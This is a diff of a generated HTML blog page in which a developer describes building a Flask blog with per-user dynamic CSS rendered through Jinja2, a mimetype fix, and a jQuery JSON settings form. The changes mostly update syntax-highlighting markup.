-&lt;p&gt;then I just made a query to list all the user made posts and rendered the result in &lt;code class=&quot;highlighter-rouge&quot;&gt;/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;then I just made a query to list all the user made posts and rendered the result in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;del&gt;add the ability to share posts&lt;/del&gt; DONE&lt;/p&gt;
 
@@ -343,29 +890,29 @@ and made the css file for the post dynamic&lt;/p&gt;
 
 &lt;p&gt;the db side was pretty much the same as above with some minor tweaks&lt;/p&gt;
 
-&lt;p&gt;but making the css dynamic errored a lot because &lt;code class=&quot;highlighter-rouge&quot;&gt;{}&lt;/code&gt; gets parsed the jinja2 the template engine for 
+&lt;p&gt;but making the css dynamic errored a lot because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{}&lt;/code&gt; gets parsed the jinja2 the template engine for 
 flask, so I had to figure out a way to make it work
 after reading stuff online, I ended up with this&lt;/p&gt;
 
 &lt;p&gt;backend code&lt;/p&gt;
-&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_resource_as_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;open_resource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_resource_as_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;utf-8&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;open_resource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter_by&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;post_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter_by&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;post_color&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter_by&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;color&lt;/span&gt; 
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;filter_by&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;post_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;filter_by&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;post_color&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;filter_by&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;color&lt;/span&gt; 
 
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;clean-blog.css&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_resource_as_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;static/css/clean-blog.css&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;clean-blog.css&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_resource_as_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;static/css/clean-blog.css&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;template file&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{{w}}
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{{w}}
 
-* {{'{'}}
+* {{&apos;{&apos;}}
     font-size: {{size}};
     color: {{color}};
-    {{'}'}}
+    {{&apos;}&apos;}}
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;em&gt;I know it’s a mess but it works&lt;/em&gt;&lt;/p&gt;
@@ -381,19 +928,19 @@ after changing the css code a lot, I didn’t get any change in the thing
 so I examined the response and it turns out it was sending a wrong mimetype which led the browser
 into not executing it
 so I changed the code to this&lt;/p&gt;
-&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;clean-blog.css&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_resource_as_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;static/css/clean-blog.css&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mimetype&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;clean-blog.css&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_resource_as_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;static/css/clean-blog.css&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mimetype&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;text/css&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;aaand it worked :)&lt;/p&gt;
 
 &lt;p&gt;&lt;del&gt;make the looks customizable&lt;/del&gt; DONE&lt;/p&gt;
 
-&lt;p&gt;now changing the regular &lt;code class=&quot;highlighter-rouge&quot;&gt;Content-type: application/url-encoded&lt;/code&gt; form to use json wasn’t that simple
+&lt;p&gt;now changing the regular &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-type: application/url-encoded&lt;/code&gt; form to use json wasn’t that simple
 maybe there’s a better way but I used javascript to submit a json request since I had jquery already
 fetched with template I utilized it&lt;/p&gt;
 
-&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;submitSettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
-            &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;`{&quot;color&quot; : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;#choosenColor&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;serializeArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;, &quot;size&quot;: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;#choosenSize&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;serializeArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;}`&lt;/span&gt;
-            &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ajax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;submitSettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+            &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;`{&quot;color&quot; : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;#choosenColor&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;serializeArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;, &quot;size&quot;: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;#choosenSize&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;serializeArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;}`&lt;/span&gt;
+            &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ajax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
                 &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                 &lt;span class=&quot;na&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/customize&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                 &lt;span class=&quot;na&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
@@ -401,7 +948,7 @@ fetched with template I utilized it&lt;/p&gt;
                 &lt;span class=&quot;na&quot;&gt;dataType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                 &lt;span class=&quot;na&quot;&gt;contentType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;application/json&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;
                 &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
